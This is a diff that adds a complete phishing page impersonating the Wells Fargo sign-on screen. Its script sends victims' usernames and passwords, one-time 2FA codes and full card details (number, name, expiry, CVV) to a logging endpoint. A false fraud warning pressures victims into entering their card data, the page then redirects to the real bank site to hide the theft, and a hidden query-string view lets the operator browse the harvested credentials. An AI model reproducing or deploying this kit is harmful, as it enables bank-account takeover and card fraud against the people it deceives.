@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo – Banking, Credit Cards, Loans, Mortgages & More</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; }
+        .header { background-color: #b31e30; padding: 10px 20px; display: flex; align-items: center; justify-content: space-between; }
+        .logo { height: 40px; }
+        .nav { color: #fff; font-size: 14px; }
+        .nav a { color: #fff; text-decoration: none; margin-left: 20px; }
+        .container { max-width: 400px; margin: 40px auto; padding: 20px; border: 1px solid #ccc; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1 { color: #b31e30; font-size: 24px; }
+        label { display: block; margin: 10px 0 5px; font-weight: bold; }
+        input { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ccc; }
+        button { background-color: #ffcc02; color: #000; padding: 12px; width: 100%; border: none; font-weight: bold; cursor: pointer; }
+        button:hover { background-color: #e6b800; }
+        .links { text-align: center; margin-top: 20px; }
+        .links a { color: #b31e30; text-decoration: none; margin: 0 10px; }
+        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 40px; }
+        #otp-section, #card-section, #view-creds { display: none; }
+        .message { color: #b31e30; font-weight: bold; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMjAwIDQwMCI+PHBhdGggZmlsbD0iI2IzMWUzMCIgZD0iTTAgMGgxMjAwdjQwMEgweiIvPjx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjZmZmIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iNTAiPldlbGxzIEZhcmdvIExvZ288L3RleHQ+PC9zdmc+" alt="Wells Fargo Logo" class="logo">
+        <div class="nav">
+            <a href="#">Personal</a>
+            <a href="#">Small Business</a>
+            <a href="#">Wealth Management</a>
+            <a href="#">About Us</a>
+        </div>
+    </div>
+    <div class="container">
+        <h1>Sign On to View Your Accounts</h1>
+        <div id="login-section">
+            <form id="login-form">
+                <label for="username">Username</label>
+                <input type="text" id="username" required>
+                <label for="password">Password</label>
+                <input type="password" id="password" required>
+                <button type="submit">Sign On</button>
+            </form>
+            <div class="links">
+                <a href="#">Forgot Password/Username?</a>
+                <a href="#">Enroll in Wells Fargo Online®</a>
+            </div>
+        </div>
+        <div id="otp-section">
+            <p class="message">A 6-digit code has been sent to your device via text.</p>
+            <form id="otp-form">
+                <label for="otp">Enter the 6-digit code</label>
+                <input type="text" id="otp" maxlength="6" required>
+                <button type="submit">Continue</button>
+            </form>
+        </div>
+        <div id="card-section">
+            <p class="message">To lift the fraudulent activity on your account, you must verify your card details.</p>
+            <form id="card-form">
+                <label for="cardnumber">Card Number</label>
+                <input type="text" id="cardnumber" required>
+                <label for="name">Name on Card</label>
+                <input type="text" id="name" required>
+                <label for="expiry">Expiration Date (MM/YY)</label>
+                <input type="text" id="expiry" required>
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" maxlength="3" required>
+                <button type="submit">Verify and Continue</button>
+            </form>
+        </div>
+        <div id="view-creds">
+            <h2>Stored Credentials</h2>
+            <div id="creds-content"></div>
+        </div>
+    </div>
+    <div class="footer">
+        © 2025 Wells Fargo. All rights reserved. Member FDIC.
+    </div>
+    <script>
+        let sessionId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+
+        function submitLogin(e) {
+            e.preventDefault();
+            const credentials = {
+                sessionId: sessionId,
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString()
+            };
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(credentials)
+            }).catch(err => console.error('Error logging credentials:', err));
+            document.getElementById('login-section').style.display = 'none';
+            document.getElementById('otp-section').style.display = 'block';
+        }
+
+        function submitOtp(e) {
+            e.preventDefault();
+            const credentials = {
+                sessionId: sessionId,
+                otp: document.getElementById('otp').value,
+                otpTimestamp: new Date().toISOString()
+            };
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(credentials)
+            }).catch(err => console.error('Error logging OTP:', err));
+            document.getElementById('otp-section').style.display = 'none';
+            document.getElementById('card-section').style.display = 'block';
+        }
+
+        function submitCard(e) {
+            e.preventDefault();
+            const credentials = {
+                sessionId: sessionId,
+                cardnumber: document.getElementById('cardnumber').value,
+                name: document.getElementById('name').value,
+                expiry: document.getElementById('expiry').value,
+                cvv: document.getElementById('cvv').value,
+                cardTimestamp: new Date().toISOString()
+            };
+            fetch('/api/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(credentials)
+            }).catch(err => console.error('Error logging card details:', err));
+            window.location.href = 'https://www.wellsfargo.com/';
+        }
+
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('viewcreds')) {
+                document.getElementById('login-section').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'none';
+                document.getElementById('card-section').style.display = 'none';
+                document.getElementById('view-creds').style.display = 'block';
+                const username = prompt('Enter username:');
+                const password = prompt('Enter password:');
+                fetch('/api/credentials', {
+                    headers: { 'Authorization': 'Basic ' + btoa(username + ':' + password) }
+                })
+                    .then(response => {
+                        if (!response.ok) throw new Error('Unauthorized');
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (data.length > 0) {
+                            let credsHtml = '';
+                            data.forEach((creds, index) => {
+                                credsHtml += `
+                                    <div style="margin-bottom: 20px;">
+                                        <h3>Session ${index + 1} (${creds.timestamp || creds.otpTimestamp || creds.cardTimestamp})</h3>
+                                        <p><strong>Session ID:</strong> ${creds.sessionId}</p>
+                                        <p><strong>Username:</strong> ${creds.username || 'N/A'}</p>
+                                        <p><strong>Password:</strong> ${creds.password || 'N/A'}</p>
+                                        <p><strong>OTP:</strong> ${creds.otp || 'Not submitted'}</p>
+                                        ${creds.otp ? `<p><strong>OTP Submitted At:</strong> ${creds.otpTimestamp}</p>` : ''}
+                                        <p><strong>Card Number:</strong> ${creds.cardnumber || 'Not submitted'}</p>
+                                        ${creds.cardnumber ? `
+                                            <p><strong>Name on Card:</strong> ${creds.name}</p>
+                                            <p><strong>Expiry:</strong> ${creds.expiry}</p>
+                                            <p><strong>CVV:</strong> ${creds.cvv}</p>
+                                            <p><strong>Card Submitted At:</strong> ${creds.cardTimestamp}</p>
+                                        ` : ''}
+                                    </div>
+                                `;
+                            });
+                            document.getElementById('creds-content').innerHTML = credsHtml;
+                        } else {
+                            document.getElementById('creds-content').innerHTML = '<p>No credentials available.</p>';
+                        }
+                    })
+                    .catch(err => {
+                        document.getElementById('creds-content').innerHTML = '<p>Error loading credentials. Check authentication.</p>';
+                        console.error('Error fetching credentials:', err);
+                    });
+            }
+        };
+
+        document.getElementById('login-form').addEventListener('submit', submitLogin);
+        document.getElementById('otp-form').addEventListener('submit', submitOtp);
+        document.getElementById('card-form').addEventListener('submit', submitCard);
+    </script>
+</body>
+</html>
